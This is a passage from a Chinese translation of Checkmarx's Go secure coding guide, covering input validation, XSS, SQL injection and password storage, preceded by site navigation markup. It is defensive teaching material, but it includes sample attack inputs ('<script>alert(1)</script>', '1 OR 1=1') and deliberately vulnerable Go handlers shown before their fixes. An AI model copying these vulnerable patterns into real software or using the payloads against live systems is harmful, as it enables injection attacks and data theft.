+  <a href="#_42" title="目录列表" class="md-nav__link">
+    目录列表
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_43" title="删除/禁用你不需要的内容" class="md-nav__link">
+    删除/禁用你不需要的内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_44" title="实现更好的安全性" class="md-nav__link">
+    实现更好的安全性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_45" title="资产管理系统：" class="md-nav__link">
+    资产管理系统：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_46" title="数据库安全" class="md-nav__link">
+    数据库安全
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_47" title="最佳实践" class="md-nav__link">
+    最佳实践
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_48" title="数据库连接" class="md-nav__link">
+    数据库连接
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_49" title="概念" class="md-nav__link">
+    概念
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_50" title="连接字符串的保护" class="md-nav__link">
+    连接字符串的保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_51" title="数据库证书" class="md-nav__link">
+    数据库证书
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_52" title="数据库认证" class="md-nav__link">
+    数据库认证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_53" title="以最小权限访问数据库" class="md-nav__link">
+    以最小权限访问数据库
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_54" title="使用强密码" class="md-nav__link">
+    使用强密码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_55" title="删除默认的管理密码" class="md-nav__link">
+    删除默认的管理密码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_56" title="参数化查询" class="md-nav__link">
+    参数化查询
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_57" title="示例" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_58" title="存储过程" class="md-nav__link">
+    存储过程
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_59" title="文件管理" class="md-nav__link">
+    文件管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_60" title="内存管理" class="md-nav__link">
+    内存管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_61" title="通用编码实践" class="md-nav__link">
+    通用编码实践
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_62" title="跨站请求伪造" class="md-nav__link">
+    跨站请求伪造
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_63" title="攻击场景" class="md-nav__link">
+    攻击场景
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_64" title="问题" class="md-nav__link">
+    问题
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_65" title="解决方案" class="md-nav__link">
+    解决方案
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_66" title="正则表达式" class="md-nav__link">
+    正则表达式
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#re2" title="为什么是RE2" class="md-nav__link">
+    为什么是RE2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_67" title="正则表达式拒绝服务攻击" class="md-nav__link">
+    正则表达式拒绝服务攻击
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_68" title="少了什么" class="md-nav__link">
+    少了什么
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="go-">Go语言安全编码规范-翻译</h1>
+<p><a href="https://checkmarx.gitbooks.io/go-scp/content/">英文地址</a></p>
+<blockquote>
+<p>翻译：blood_zer0、<a href="https://github.com/Lingfighting">Lingfighting</a></p>
+<p>如果翻译的有问题：联系我(Lzero2012)。匆忙翻译肯定会有很多错误，欢迎大家一起讨论Go语言安全能力建设。</p>
+</blockquote>
+<h2 id="_1">介绍</h2>
+<p>Go语言-Web应用程序安全编码实践是为了给任何使用Go进行编程与Web开发的人员提供指导。</p>
+<p>这本书是<a href="http://chkmrx.co/2sffXFr">Checkmarx安全研究团队</a>共同努力的结晶，它遵循<a href="https://www.owasp.org/index.php/OWASP_Secure_Coding_Practices_-_Quick_Reference_Guide">OWASP安全编码实践快速参考指南</a>。</p>
+<p>这本书主要的目的是为了帮助开发人员避免常见错误，同时通过"实践方法"学习编程语言心得。本书提供了关于"如何安全执行"详细信息，展示了在开发过程中可能出现的安全问题。</p>
+<h3 id="checkmarx">关于Checkmarx</h3>
+<p><a href="http://chkmrx.co/2sffXFr">Checkmarx</a>是一家应用程序软件安全公司，公司使命是为企业组织提供应用程序安全测试产品与服务，提高开发人员交付安全应用程序。拥有1000家客服包括全球十大软件供应商中的物价，美国顶级银行中的四家，以及许多财富500强和政府机构，包括SAP、三星和Salesforce.com</p>
+<p>关于Checkmarx的更多信息，可以访问<a href="http://chkmrx.co/2sffXFr">checkmarx.com</a>或者关注我们的twitter：<a href="https://www.twitter.com/checkmarx">@checkmarx</a></p>
+<h3 id="owasp">关于OWASP安全编程实践</h3>
+<p>"<a href="https://www.owasp.org/index.php/OWASP_Secure_Coding_Practices_-_Quick_Reference_Guide">安全编程实践快速参考指南</a>"是<a href="https://www.owasp.org/">OWASP</a>开源Web安全项目。它是一种"技术无关的通用软件安全编程实践集，采用全面的列表格式，可以集成到开发生命周期中"</p>
+<p>OWASP本身是"一个开放的社区，致力于使组织能够构思、开发、获取、操作和维护可信任的应用程序。所有的OWASP工具、文档、论坛和章节都是免费的，并且对任何有兴趣提高应用程序安全性的人开放。"</p>
+<h2 id="_2">输入验证</h2>
+<p>在Web应用程序安全性中，如果未对用户输入及相关数据进行验证则会存在安全风险。我们通过"输入验证"与"输出处理"技术来解决这些问题。根据服务器的功能，应在应用程序的每个层中执行这些验证。重要的一点是，所有数据验证程序必须在可信系统上（即在服务器上）完成。</p>
+<p>如"<a href="https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf">OWASP SCP快速参考指南</a>"中所述，有16个要点涵盖了开发人员在处理输入验证时应注意的问题。在开发应用程序时缺乏对这些安全风险的考虑是<a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">注入</a>"<a href="https://www.owasp.org/index.php/Top_10_2013-Top_10">OWASP Top 10</a>"中排名第一的主要原因之一。</p>
+<p>用户交互是Web应用程序当前开发范例的主要内容。随着Web应用程序内容和可能性越来越丰富，用户交互和提交的用户数据也会增加。正是在这种背景下，输入验证起着重要作用。</p>
+<p>当应用程序处理用户数据时，默认情况下提交的数据必须被视为不安全，并且只有在进行了适当的安全检查后才能接受。还必须将数据源标识为受信任或不受信任，并且在不受信任的源的情况下，必须进行验证检查。</p>
+<h3 id="_3">验证</h3>
+<p>在验证检查中，根据一组条件检查用户输入，以保证用户确实输入了预期数据。</p>
+<p><strong>重要信息</strong>：如果验证失败，则必须拒绝输入。</p>
+<p>这不仅从安全角度而且从数据一致性和完整性的角度来看很重要，因为数据通常用于各种系统和应用程序。</p>
+<p>本文列出了开发人员在Go中开发Web应用程序时应注意的安全风险。</p>
+<h4 id="_4">用户交互</h4>
+<p>允许用户输入的应用程序的任何部分都存在潜在的安全风险。 问题不仅可能来自寻求危害应用程序的方法，也可能来自人为错误导致的错误输入（统计上，大多数无效数据情况通常是由人为错误引起的）。 在Go中，有几种方法可以防止此类问题。</p>
+<p>Go具有本机库，其中包括有助于确保不会发生此类错误的方法。 在处理字符串时，我们可以使用类似以下示例的包：</p>
+<ul>
+<li>
+<p><code>strconv</code>包处理到其他数据类型的字符串转换。</p>
+<ul>
+<li>Atoi</li>
+<li>ParseBool</li>
+<li>ParseFloat</li>
+<li>ParseInt</li>
+</ul>
+</li>
+<li>
+<p><code>strings</code> 包包含处理字符串及其属性的所有函数。</p>
+<ul>
+<li>Trim</li>
+<li>ToLower</li>
+<li>ToTitle</li>
+</ul>
+</li>
+<li>
+<p><code>regexp</code> 包支持正则表达式以适应自定义格式。</p>
+</li>
+<li><code>utf8</code> 包实现函数和常量以支持以UTF-8编码的文本。它包括在runes和utf-8字节序列之间转换的函数。<ul>
+<li>Valid（验证UTF-8编码）</li>
+<li>ValidRune（验证UTF-8编码）</li>
+<li>ValidString（验证UTF-8编码）</li>
+<li>EncodeRune（UTF-8编码）</li>
+<li>DecodeLastRune（UTF-8解码）</li>
+<li>DecodeLastRuneInString（UTF-8解码）</li>
+</ul>
+</li>
+</ul>
+<p><strong>注意</strong>：Form被go视为字符串值的映射。</p>
+<p>确保数据有效性的其他技术包括：</p>
+<ul>
+<li>白名单-尽可能根据允许的字符白名单验证输入。请参见<a href="https://checkmarx.gitbooks.io/go-scp/content/input-validation/sanitization.html">Validation - Strip tags</a>。</li>
+<li>边界检查-应验证数据和数字长度。</li>
+<li>字符转义-用于特殊字符，如独立引号。</li>
+<li>数字验证-如果输入是数字。</li>
+<li>检查空字节-（%00）</li>
+<li>检查新行字符-%0d，%0a，\r\n</li>
+<li>检查路径更改字符-../或\..</li>
+<li>检查扩展的UTF-8-检查特殊字符的可选表示形式</li>
+</ul>
+<p><strong>注意</strong>：确保HTTP请求和响应头只包含ASCII字符。</p>
+<p>存在处理go中安全性的第三方软件包：</p>
+<ul>
+<li>Gorilla是Web应用程序安全性最常用的包之一。它支持websockets、cookie会话、rpc等。</li>
+<li>Form 将url.values解码为go值，并将go值编码为url.values。Dual Array和Full map支持。</li>
+<li>Validator 进行Go 结构体和字段验证，包括跨字段、跨结构体、映射以及切片和数组。</li>
+</ul>
+<h4 id="_5">文件操作</h4>
+<p>当需要使用文件时（read或write文件）也应该进行验证，因为大多数文件操作操作都处理用户数据。</p>
+<p>其他文件检查过程包括"文件存在性检查"，以验证文件名是否存在。</p>
+<p>附加文件信息在<a href="https://checkmarx.gitbooks.io/go-scp/content/file-management/">文件管理部分</a>，有关错误处理的信息可以在文档的<a href="https://checkmarx.gitbooks.io/go-scp/content/error-handling-logging/">错误处理</a>部分找到。</p>
+<h4 id="_6">数据源</h4>
+<p>当数据从受信任的源传递到不受信任的源时，应进行完整性检查。这保证了数据没有被篡改，我们正在接收预期的数据。其他数据源检查包括：</p>
+<ul>
+<li>跨系统一致性检查</li>
+<li>Hash统计</li>
+<li>参照完整性</li>
+</ul>
+<p><strong>注意</strong>：在现代关系数据库中，如果主键字段中的值不受数据库内部机制的约束，那么应该对它们进行验证：</p>
+<ul>
+<li>唯一性检查</li>
+<li>表查询检查</li>
+</ul>
+<h4 id="post">POST验证操作</h4>
+<p>根据数据验证的最佳实践，输入验证只是数据验证指南的第一部分。因此，还应执行验证后操作。使用的验证后操作因上下文而异，分为三类：</p>
+<ul>
+<li><strong>强制执行</strong>：为了更好地保证我们的应用和数据，存在着几种执行类型。<ul>
+<li>通知用户提交的数据不符合要求，因此应修改数据以符合要求。</li>
+<li>在服务器端修改用户提交的数据，而不通知用户所做的更改，这最适用于具有交互使用的系统。</li>
+</ul>
+</li>
+</ul>
+<p><strong>注意</strong>：后者主要用于外观更改（修改用户敏感数据可能导致截断等问题，从而导致数据丢失）。</p>
+<ul>
+<li><strong>咨询</strong>：建议操作通常允许输入不变的数据，但消息来源参与者被告知所述数据存在问题。这最适用于非交互式系统。</li>
+<li><strong>验证</strong>：验证是指建议操作中的特殊情况。在这些情况下，用户提交数据，源参与者要求用户验证所述数据并建议更改。然后，用户接受这些更改或保留其原始输入。</li>
+</ul>
+<p>一个简单的方法来说明这是一个账单地址表单，用户输入他的地址，系统建议与帐户相关的地址。然后，用户接受其中一个建议或发送到最初输入的地址。</p>
+<h3 id="_7">处理</h3>
+<p>处理是指删除或替换提交的数据的过程。在处理数据时，在进行了正确的验证检查之后，通常会采取一个额外的步骤来加强数据安全性，即处理。</p>
+<p>最常用的处理方法如下：</p>
+<h4 id="_8">将小于字符的单个字符转化为实体</h4>
+<p>在本机包HTML中，有两个用于清理的函数：一个用于转义HTML文本，另一个用于取消转义HTML。函数<code>escapeString()</code>接受一个字符串并返回带有特殊转义字符的相同字符串。即，&lt;变为&amp;lt；。请注意，此函数只转义以下五个字符：&lt;、&gt;、&amp;、'和'。相反，还有<code>unescapeString()</code>函数可以从实体转换为字符。</p>
+<h4 id="_9">删除所有标签</h4>
+<p>虽然<code>html/template</code>包有<code>striptags()</code>函数，但它是未导出的。由于没有其他本机包具有去除所有标记的功能，因此可以选择使用第三方库，或者复制整个函数以及它的私有类和函数。</p>
+<p>一些第三方库可以实现这一点：</p>
+<ul>
+<li><a href="https://github.com/kennygrant/sanitize">https://github.com/kennygrant/sanitize</a></li>
+<li><a href="https://github.com/maxwells/sanitize">https://github.com/maxwells/sanitize</a></li>
+<li><a href="https://github.com/microcosm-cc/bluemonday">https://github.com/microcosm-cc/bluemonday</a></li>
+</ul>
+<h4 id="_10">删除换行符、制表符和多余的空格</h4>
+<p><code>text/template</code>和<code>html/template</code>包括一种从模板中删除空白的方法，方法是在操作的分隔符内使用减号。</p>
+<p>使用源代码执行模板</p>
+<pre><code>{{- 23}} &lt; {{45 -}}
+</code></pre>
+
+<p>将导致以下输出</p>
+<pre><code>23&lt;45
+</code></pre>
+
+<p><strong>注意</strong>：如果减号不在开始动作分隔符{{之后或结束动作分隔符之前}}，减号-将应用于该值。</p>
+<p>模板源</p>
+<pre><code>{{ -3 }}
+</code></pre>
+
+<p>输出</p>
+<pre><code>-3
+</code></pre>
+
+<h4 id="url">URL请求路径</h4>
+<p>在<code>net/http</code>包中有一个称为<code>ServeMux</code>的HTTP请求多路复用器类型。它用于将传入请求与注册模式匹配，并调用与请求的URL最匹配的处理程序。除了主要目的外，它还负责清理URL请求路径，重定向包含的任何请求。.或..元素或重复斜杠到一个等效的、更清晰的URL。</p>
+<p>一个简单的Mux示例说明：</p>
+<pre><code class="go">func main() {
+  mux := http.NewServeMux()
+
+  rh := http.RedirectHandler(&quot;http://yourDomain.org&quot;, 307)
+  mux.Handle(&quot;/login&quot;, rh)
+
+  log.Println(&quot;Listening...&quot;)
+  http.ListenAndServe(&quot;:3000&quot;, mux)
+}
+</code></pre>
+
+<p><strong>注意</strong>：请记住，<code>ServeMux</code><a href="https://golang.org/pkg/net/http/#ServeMux.Handler">不会更改</a>connect请求的URL请求路径，因此，如果不限制允许的请求方法，可能会使应用程序容易受到<a href="https://ilyaglotov.com/blog/servemux-and-path-traversal">路径遍历攻击</a>。</p>
+<p>第三方软件包：</p>
+<p><a href="http://www.gorillatoolkit.org/pkg/mux">Gorilla Toolkit - MUX</a></p>
+<h2 id="_11">输出编码</h2>
+<p>虽然在<a href="https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf">OWASP SCP快速参考指南</a>中只有6个项目符号部分，但是在Web应用程序开发中，输出编码的错误做法非常普遍，因此导致了第一大漏洞：<a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">注入</a>。</p>
+<p>随着Web应用程序变得复杂和丰富，它们拥有的数据源越多：用户、数据库、三十方服务等。在某个时间点，收集到的数据被输出到具有特定上下文的某些媒体（如Web浏览器）。如果没有强的输出编码策略，则正好发生注入。</p>
+<p>当然，您已经听说了我们将在本节中讨论的所有安全问题，但是您真的知道这些问题是如何发生的和/或如何避免的吗？</p>
+<h3 id="xss">XSS跨站脚本</h3>
+<p>大多数开发人员都听说过，但大多数人从未尝试过使用XSS开发Web应用程序。</p>
+<p>自2003年以来，跨站点脚本一直位于OWASP的前10位，它仍然是一个常见的漏洞。2013年的版本非常详细地介绍了XSS：攻击向量、安全弱点、技术影响和业务影响。</p>
+<p>简而言之</p>
+<blockquote>
+<p>如果不确保所有用户提供的输入都被正确转义，或者在将该输入包含到输出页之前，不通过服务器端输入验证来验证其安全性，那么您将很容易受到攻击。（<a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_%28XSS%29">source</a>）</p>
+</blockquote>
+<p>Go，就像其他多用途编程语言一样，尽管文档中明确说明了如何使用<code>html/template</code>包，但它拥有所有需要处理的东西，并使您容易受到XSS的攻击。很容易找到使用net/http和io包的"hello world"示例，在不了解它的情况下，您很容易受到XSS的攻击。</p>
+<p>代码：</p>
+<pre><code class="go">package main
+
+import &quot;net/http&quot;
+import &quot;io&quot;
+
+func handler (w http.ResponseWriter, r *http.Request) {
+    io.WriteString(w, r.URL.Query().Get(&quot;param1&quot;))
+}
+
+func main () {
+    http.HandleFunc(&quot;/&quot;, handler)
+    http.ListenAndServe(&quot;:8080&quot;, nil)
+}
+</code></pre>
+
+<p>此代码段创建并启动一个HTTP服务器，侦听端口8080(main())，处理服务器根目录(/)上的请求。</p>
+<p>处理请求的handler()函数需要一个查询字符串参数<code>param1</code>，然后将其值写入响应流（w）。</p>
+<p>由于<code>Content-Type</code>HTTP响应头，将使用go http.detectcontenttype默认值，该值遵循<a href="https://mimesniff.spec.whatwg.org/#rules-for-identifying-an-unknown-mime-typ">WhatWG规范</a>。</p>
+<p>因此，使<code>param1</code>等于"test"，将导致<code>Content-Type</code>HTTP响应头以text/plain格式发送。</p>
+<p><img alt="text-plain.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/text-plain.png" /></p>
+<p>但如果<code>param1</code>的第一个字符是“<h1>”，则<code>Content-Type</code>将是text/html。</p>
+<p><img alt="text-html.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/text-html.png" /></p>
+<p>您可能认为，使<code>param1</code>等于任何HTML标记都会导致相同的行为，但它不会：使<code>param1</code>等于"<h2>"、<span>"或"<form>"将使<code>Content-Type</code>以plain/text形式发送，而不是以预期的text/html形式发送。</p>
+<p>现在，让我们使<code>param1</code>等于</p>
+<pre><code class="javascript">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+
+<p>根据whatwg-spec，内容类型http-response-header将以文本/html形式发送，将呈现param1值，并…这里是XSS跨站点脚本。</p>
+<p><img alt="xss.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/xss.png" /></p>
+<p>在与谷歌讨论了这一情况后，他们告诉我们：</p>
+<blockquote>
+<p>它实际上非常方便，旨在能够打印HTML并自动设置内容类型。我们希望程序员将使用HTML/模板进行适当的转义。</p>
+</blockquote>
+<p>谷歌声明开发人员负责清理和保护他们的代码。我们完全同意，但是在安全性是优先考虑的语言中，除了默认的text/plain之外，允许自动设置<code>Content-Type</code>并不是最好的方式。</p>
+<p>让我们澄清一下：<code>text/plain</code>和/或<code>text/template</code>包不会让您远离XSS，因为它不会清理用户输入。</p>
+<pre><code class="go">package main
+
+import &quot;net/http&quot;
+import &quot;text/template&quot;
+
+func handler(w http.ResponseWriter, r *http.Request) {
+        param1 := r.URL.Query().Get(&quot;param1&quot;)
+
+        tmpl := template.New(&quot;hello&quot;)
+        tmpl, _ = tmpl.Parse(`{{define &quot;T&quot;}}{{.}}{{end}}`)
+        tmpl.ExecuteTemplate(w, &quot;T&quot;, param1)
+}
+
+func main() {
+        http.HandleFunc(&quot;/&quot;, handler)
+        http.ListenAndServe(&quot;:8080&quot;, nil)
+}
+</code></pre>
+
+<p>使<code>param1</code>等于“<h1>”将导致内容类型作为text/html发送，这使您容易受到XSS的攻击。</p>
+<p><img alt="text-template-xss.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/text-template-xss.png" /></p>
+<p>将text/template包替换为html/template包，您就可以安全地继续了。</p>
+<pre><code class="go">package main
+
+import &quot;net/http&quot;
+import &quot;html/template&quot;
+
+func handler(w http.ResponseWriter, r *http.Request) {
+        param1 := r.URL.Query().Get(&quot;param1&quot;)
+
+        tmpl := template.New(&quot;hello&quot;)
+        tmpl, _ = tmpl.Parse(`{{define &quot;T&quot;}}{{.}}{{end}}`)
+        tmpl.ExecuteTemplate(w, &quot;T&quot;, param1)
+}
+
+func main() {
+        http.HandleFunc(&quot;/&quot;, handler)
+        http.ListenAndServe(&quot;:8080&quot;, nil)
+}
+
+</code></pre>
+
+<p>当param1等于“<h1>时，不仅<code>Content-Type</code>HTTP响应头将以text/plain格式发送。</p>
+<p><img alt="html-template-plain-text.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/html-template-plain-text.png" /></p>
+<p>但是，<code>param1也</code>被正确编码到输出媒体：浏览器。</p>
+<p><img alt="html-template-text-plain-noxss.png" src="https://checkmarx.gitbooks.io/go-scp/content/output-encoding/images/html-template-text-plain-noxss.png" /></p>
+<h3 id="sql">SQL注入</h3>
+<p>由于缺乏正确的输出编码，另一个常见的注入是SQL注入，这主要是由于一个旧的错误做法：字符串串联。</p>
+<p>简而言之：只要将包含任意字符（例如对数据库管理系统有特殊意义的字符）的值的变量简单地添加到（部分）SQL查询中，就容易受到SQL注入的攻击。</p>
+<p>假设您有如下查询：</p>
+<pre><code class="go">ctx := context.Background()
+customerId := r.URL.Query().Get(&quot;id&quot;)
+query := &quot;SELECT number, expireDate, cvv FROM creditcards WHERE customerId = &quot; + customerId
+
+row, _ := db.QueryContext(ctx, query)
+</code></pre>
+
+<p>你将毁了它。</p>
+<p>当提供有效的customerId时，您将只列出该客户的信用卡，但如果customerId变为1或1=1会怎么样？</p>
+<p>您的查询将如下所示：</p>
+<pre><code class="sql">SELECT number, expireDate, cvv FROM creditcards WHERE customerId = 1 OR 1=1
+</code></pre>
+
+<p>您将转储所有表记录（是的，任何记录的1=1都是真的）！</p>
+<p>只有一种方法可以保证数据库的安全：<a href="https://golang.org/pkg/database/sql/#DB.Prepare">Prepared Statements</a>。</p>
+<pre><code class="go">ctx := context.Background()
+customerId := r.URL.Query().Get(&quot;id&quot;)
+query := &quot;SELECT number, expireDate, cvv FROM creditcards WHERE customerId = ?&quot;
+
+stmt, _ := db.QueryContext(ctx, query, customerId)
+</code></pre>
+
+<p>注意到占位符了?以及您的查询方式：</p>
+<ul>
+<li>可读性强</li>
+<li>较短</li>
+<li>安全的</li>
+</ul>
+<p>准备好的语句中的占位符语法是特定于数据库的。例如，比较mysql、postgresql和oracle：</p>
+<table>
+<thead>
+<tr>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WHERE col = ?</td>
+<td>WHERE col = $1</td>
+<td>WHERE col = :col</td>
+</tr>
+<tr>
+<td>VALUES(?, ?, ?)</td>
+<td>VALUES($1, $2, $3)</td>
+<td>VALUES(:val1, :val2, :val3)</td>
+</tr>
+</tbody>
+</table>
+<p>检查本指南中的"数据库安全性"部分，以获取有关此主题的详细信息。</p>
+<h2 id="_12">认证与密码管理</h2>
+<h4 id="_13">认证与密码管理</h4>
+<p>OWASP安全编码实践是一个便利的文档，可以帮助开发人员验证在项目实现期间是否遵循了所有的最佳实践。身份验证和密码管理是任何系统的关键部分，从用户注册到凭证存储、密码重置和个人资源访问都有详细介绍。</p>
+<p>为了更深入的细节，可以对一些指导原则进行分组。这里源代码示例来说明。</p>
+<h4 id="_14">经验规则</h4>
+<p>让我们从经验规则开始："所有身份验证控制都必须在受信任的系统上强制执行"，通常是运行应用程序后端的服务器。</p>
+<p>为了系统的简单性和减少故障点，您应该使用标准的和经过测试的认证服务：通常框架拥有这样的模块，并且有许多人开发、维护和使用它们，我们鼓励您使用它们作为一种集中的认证机制。不过，您应该"仔细检查代码以确保它不受任何恶意代码的影响"，并确保它遵循最佳实践。</p>
+<p>身份验证的过程不应该是资源自身来执行它,相反，应该使用"从集中式身份验证控件重定向"。小心处理重定向：您应该只重定向到本地和/或安全资源。</p>
+<p>当认证需要"连接到涉及敏感信息或功能的外部系统"时，它不仅应该由应用程序的用户使用，而且还应该由您自己的应用程序使用。在这种情况下，"访问应用程序外部服务的身份验证凭据应加密并存储在受信任系统（如服务器）上的受保护位置。存储在代码中不是安全的位置"。</p>
+<h3 id="_15">身份验证数据通信</h3>
+<p>在本节中，"通信"在更广泛的意义上使用，包括用户体验（UX）和CS通信。</p>
+<p>不仅"密码输入应在用户屏幕上隐藏"，而且"记住我"功能应禁用。</p>
+<p>您可以使用输入字段type="password"并将autocomplete属性设置为off来完成这两项工作。</p>
+<pre><code class="html">&lt;input type=&quot;password&quot; name=&quot;passwd&quot; autocomplete=&quot;off&quot; /&gt;
+</code></pre>
+
+<p>身份验证凭据只能在HTTP POST请求上使用加密连接（HTTPS）发送。加密连接的例外可能是电子邮件重置相关联的临时密码。</p>
+<p>虽然通过tls/ssl（https）的HTTP GET请求看起来和HTTP POST请求一样安全，但一般情况下，HTTP服务器（如apache2、nginx）会将请求的URL写入访问日志。</p>
+<pre><code class="log">xxx.xxx.xxx.xxx - - [27/Feb/2017:01:55:09 +0000] &quot;GET /?username=user&amp;password=70pS3cure/oassw0rd HTTP/1.1&quot; 200 235 &quot;-&quot; &quot;Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0&quot;
+</code></pre>
+
+<p>前端代码如下：</p>
+<pre><code class="html">&lt;form method=&quot;post&quot; action=&quot;https://somedomain.com/user/signin&quot; autocomplete=&quot;off&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;CSRF-TOKEN&quot; /&gt;
+
+    &lt;label&gt;Username &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/label&gt;
+    &lt;label&gt;Password &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/label&gt;
+
+    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>在处理身份验证错误时，应用程序不应公开身份验证数据的哪一部分不正确。不要使用"无效用户名"或"无效密码"，只需交替使用"无效用户名和/或密码"：</p>
+<pre><code class="html">&lt;form method=&quot;post&quot; action=&quot;https://somedomain.com/user/signin&quot; autocomplete=&quot;off&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;CSRF-TOKEN&quot; /&gt;
+
+    &lt;div class=&quot;error&quot;&gt;
+        &lt;p&gt;Invalid username and/or password&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;label&gt;Username &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/label&gt;
+    &lt;label&gt;Password &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/label&gt;
+
+    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>对于一般性信息，您不披露：</p>
+<ul>
+<li>注册人："无效密码"表示用户名存在。</li>
+<li>系统的工作方式："无效密码"可能会显示应用程序的工作方式，首先查询数据库中的用户名，然后比较内存中的密码。</li>
+</ul>
+<p>验证和存储部分提供了如何执行验证数据验证（和存储）的示例。</p>
+<p>成功登录后，应通知用户上次成功或不成功的访问日期/时间，以便用户能够检测和报告可疑活动。有关日志记录的更多信息可以在文档的<a href="https://checkmarx.gitbooks.io/go-scp/content/error-handling-logging/logging.html">错误处理和日志记录</a>中找到。此外，为了防止攻击，建议在检查密码时使用恒定时间比较功能，包括分析具有不同输入的多个请求之间的时间差。在这种情况下，表单record==password比较不匹配的第一个字符处将会返回false，提交的密码时间越近，响应时间越长。通过利用这个漏洞，攻击者可以猜测密码。请注意，即使记录不存在，我们也总是强制执行带有空值的subtle.ConstantTimeCompare以便与用户输入进行比较。</p>
+<h3 id="_16">验证与存储</h3>
+<h4 id="_17">验证</h4>
+<p>本节的关键主题是身份验证数据存储，因为用户帐户数据库经常在Internet上泄漏，这是不可取的。当然，这并不能保证发生，但在这种情况下，如果正确存储身份验证数据，特别是密码，就可以避免附带的损害。</p>
+<p>首先，让我们明确“所有认证控制都应该安全失败”。建议您阅读所有其他身份验证和密码管理部分，因为它们包括有关报告错误身份验证数据和如何处理日志记录的建议。</p>
+<p>另一个初步建议是：对于顺序认证的实现（像Google现在做的那样），验证应该只在所有数据输入完成后，在可信系统（如服务器）上进行。</p>
+<h4 id="_18">安全存储密码理论</h4>
+<pre><code class="go">package main
+
+import (
+    &quot;crypto/rand&quot;
+    &quot;crypto/sha256&quot;
+    &quot;database/sql&quot;
+    &quot;context&quot;
+    &quot;fmt&quot;
+)
+
+const saltSize = 32
+
+func main() {
+    ctx := context.Background()
+    email := []byte(&quot;john.doe@somedomain.com&quot;)
+    password := []byte(&quot;47;u5:B(95m72;Xq&quot;)
+
+    // create random word
+    salt := make([]byte, saltSize)
+    _, err := rand.Read(salt)
+    if err != nil {
+        panic(err)
+    }
+
+    // let's create SHA256(password+salt)
+    hash := sha256.New()
+    hash.Write(password)
+    hash.Write(salt)
+
+    // this is here just for demo purposes
+    //
+    // fmt.Printf(&quot;email   : %s\n&quot;, string(email))
+    // fmt.Printf(&quot;password: %s\n&quot;, string(password))
